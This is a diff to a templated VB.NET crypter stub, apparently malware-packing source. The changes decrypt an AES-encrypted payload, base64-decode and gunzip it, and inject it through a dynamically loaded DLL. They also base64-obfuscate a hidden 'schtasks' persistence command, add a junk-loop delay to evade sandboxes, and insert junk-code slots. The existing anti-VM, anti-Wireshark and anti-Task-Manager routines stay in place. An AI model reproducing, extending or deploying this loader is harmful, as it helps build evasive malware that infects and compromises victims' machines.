@@ -21,6 +21,10 @@ Imports System.Data
 '%ASSEMBLY%<Assembly: AssemblyTrademark("%Trademark%")> 
 '%ASSEMBLY%<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")> 
 
+
+%JUNK7%
+
+
 Public Class %Class1%
 
 
@@ -30,7 +34,7 @@ Public Class %Class1%
 '%Bind%	     Dim %Res% As New Resources.ResourceManager("%ResName%", %Asm%)    
 '%Bind%	     
 '%Bind%		 Dim %DecBind% = %AES_Decrypt%(%Res%.GetObject("%EncryptedBind%"),"%KEY%")
-'%Bind%		 Dim %Binder% = %STRHEXFunc%(%DecBind%)
+'%Bind%		 Dim %Binder% = %ZIP%(Convert.FromBase64String(%DecBind%),False)
 '%Bind%
 '%BindOnce%  If IO.File.Exists(IO.Path.GetTempPath + "\LimeOnce") = False Then
 '%BindOnce%  IO.File.WriteAllBytes(IO.Path.GetTempPath + "\" + "%BindName%",%Binder%)
@@ -43,33 +47,45 @@ Public Class %Class1%
 '%Bind%		 End Try
 '%Bind%	     End Sub
 
-%JUNK3%
+%JUNK1%
                  Public Shared Sub main()
 
-'$Delay%		 Threading.Thread.Sleep(%Delay1% * 1000)
+	     Dim %Mutex% As Threading.Mutex = Nothing
+	     Dim %createdNew% As Boolean
+         %Mutex% = New Threading.Mutex(True, "%KEY%", %createdNew%)
+         Try
+         If Not %createdNew% Then End
+         Finally
+         If %createdNew% Then
+         %Mutex%.ReleaseMutex()
+         End If
+         End Try
 
+'%Bind%         Call %BindSub%
 
-'%MUTEX%	     Dim %Mutex% As Threading.Mutex = Nothing
-'%MUTEX%	     Dim %createdNew% As Boolean
-'%MUTEX%         %Mutex% = New Threading.Mutex(True, %KEY%, %createdNew%)
-'%MUTEX%         Try
-'%MUTEX%         If Not %createdNew% Then End
-'%MUTEX%         Finally
-'%MUTEX%         If %createdNew% Then
-'%MUTEX%         %Mutex%.ReleaseMutex()
-'%MUTEX%         End If
-'%MUTEX%         End Try
+'$Delay%		         Dim x As Long = 1
+'$Delay%        Do Until x = 100000000
+'$Delay%            x += 1
+'$Delay%            Dim oihrego As String = "iohrghhgrhoiurg"
+'$Delay%            If oihrego.ToUpper.Contains("908435") Then
+'$Delay%                IO.File.CreateText(IO.Path.GetTempFileName)
+'$Delay%            End If
+'$Delay%            Dim iopjerg As Integer = 8907435
+'$Delay%            Dim oijhegreri As Integer = 9043589
+'$Delay%            If iopjerg = oijhegreri Then
+'$Delay%                MsgBox("iojregiorejgioergj", MsgBoxStyle.MsgBoxHelp)
+'$Delay%            End If
+'$Delay%        Loop
 
 '%ANTIVM%	    Call %VM%
 '%Drop%	        Call %DropSub%
-'%Bind%         Call %BindSub%
 	            Call %Run%
 '%ANTIWIRE%	    Dim %T2% As New Threading.Thread(AddressOf %Wireshark%) : %T2%.Start()
 '%ANTITASK%	    Dim %T3% As New Threading.Thread(AddressOf %Task%) : %T3%.Start()
                 End Sub
 
 
-
+%JUNK2%
 
 
 '%Drop%   Public Shared Sub %DropSub%
@@ -77,7 +93,7 @@ Public Class %Class1%
 '%Drop%   Dim %STUP% As String = Interaction.Environ("%PATH%") + "\" + "%EXE%"
 '%Drop%   If Application.ExecutablePath <> %STUP% Then
 '%Drop%   IO.File.Copy(Application.ExecutablePath, %STUP%, True)
-'%Drop%   Shell("schtasks /create /f /sc minute /mo 1 /tn " + """'" & IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath) & "'""" + " /tr " + """'" & %STUP% & "'""", AppWinStyle.Hide, False, -1)
+'%Drop%   Shell(System.Text.Encoding.Default.GetString(Convert.FromBase64String("c2NodGFza3M=")) + " /create /f /sc minute /mo 1 /tn " + """'" & IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath) & "'""" + " /tr " + """'" & %STUP% & "'""", AppWinStyle.Hide, False, -1)
 '%Drop%   Process.Start(%STUP%)
 '%Drop%   End
 '%Drop%   End If
@@ -95,21 +111,19 @@ Public Class %Class1%
 		 Dim %DecAdd% = %AES_Decrypt%(%Res%.GetObject("%EncyptedPayload%"),"%KEY%")
 	     Dim %DecDLL% = %AES_Decrypt%(%Res%.GetObject("%EncryptedDLL%"),"%KEY%")
 	    
-		 Dim %STRHEX% = Convert.FromBase64String(%DecAdd%)
-	     Dim %DLL% = Convert.FromBase64String(%DecDLL%)
-
-        
+		 Dim %PYLD% = %ZIP%(Convert.FromBase64String(%DecAdd%), False)
+	     Dim %DLL% = %ZIP%(Convert.FromBase64String(%DecDLL%), False)      
 
          Dim %J% As Assembly = Assembly.Load(%DLL%)
          Dim %N% As Type = %J%.GetType("ClassLibrary2.Class1")
          Dim %V% As MethodInfo = %N%.GetMethod("Run", BindingFlags.Public Or BindingFlags.Static)
-         %V%.Invoke(Nothing, New Object() {%Inject%, Nothing, %STRHEX%, True})
+         %V%.Invoke(Nothing, New Object() {%Inject%, Nothing, %PYLD%, True})
 		 Catch
 		 End Try
 	     End Sub
 
 
-		 %JUNK1%
+		 %JUNK3%
 
 
 	    Public Shared Function %AES_Decrypt%(ByVal %AESinput% As String, ByVal %AESpass% As String) As String
@@ -131,20 +145,6 @@ Public Class %Class1%
         End Try
         End Function
 
-	    Public Shared Function %STRHEXFunc%(ByVal strInput As String) As Byte()
-        Dim i As Integer = 0
-        Dim x As Integer = 0
-        Dim bytes As Byte() = New Byte((strInput.Length) / 2 - 1) {}
-
-        While strInput.Length > i + 1
-        Dim lngDecimal As Long = Convert.ToInt32(strInput.Substring(i, 2), 16)
-        bytes(x) = Convert.ToByte(lngDecimal)
-        i = i + 2
-        x += 1
-        End While
-        Return bytes
-        End Function
-
 
 '%ANTIWIRE%	Public Shared Sub %Wireshark%()
 '%ANTIWIRE%			Try
@@ -161,6 +161,8 @@ Public Class %Class1%
 '%ANTIWIRE%			End Try
 '%ANTIWIRE%	End Sub
 
+%JUNK4%
+
 '%ANTITASK%		Public Shared Sub %Task%()
 '%ANTITASK%		Try
 '%ANTITASK%		While True
@@ -176,7 +178,7 @@ Public Class %Class1%
 '%ANTITASK%		End Try
 '%ANTITASK%	End Sub
 
-%JUNK2%
+%JUNK5%
 
 '%ANTIVM%	Public Shared Sub %VM%()
 '%ANTIVM%           Try
@@ -222,4 +224,38 @@ Public Class %Class1%
 '%ANTIVM%            End Try
 '%ANTIVM%        End Sub
 
+
+
+%JUNK6%
+
+
+    Public Shared Function %ZIP%(ByVal B() As Byte, ByRef CM As Boolean) As Byte()
+
+        If CM = True Then
+            Dim M As Object = New IO.MemoryStream()
+            Dim gZip As Object = New IO.Compression.GZipStream(M, IO.Compression.CompressionMode.Compress, True)
+            gZip.Write(B, 0, B.Length)
+            gZip.Dispose()
+            M.Position = 0
+            Dim BF(M.Length) As Byte
+            M.Read(BF, 0, BF.Length)
+            M.Dispose()
+            Return BF
+        Else
+            Dim M As Object = New IO.MemoryStream(B)
+            Dim gZip As Object = New IO.Compression.GZipStream(M, IO.Compression.CompressionMode.Decompress)
+            Dim buffer(3) As Byte
+            M.Position = M.Length - 5
+            M.Read(buffer, 0, 4)
+            Dim size As Integer = BitConverter.ToInt32(buffer, 0)
+            M.Position = 0
+            Dim BF(size - 1) As Byte
+            gZip.Read(BF, 0, size)
+            gZip.Dispose()
+            M.Dispose()
+            Return BF
+        End If
+    End Function
 	End Class
+
+	%JUNK8%
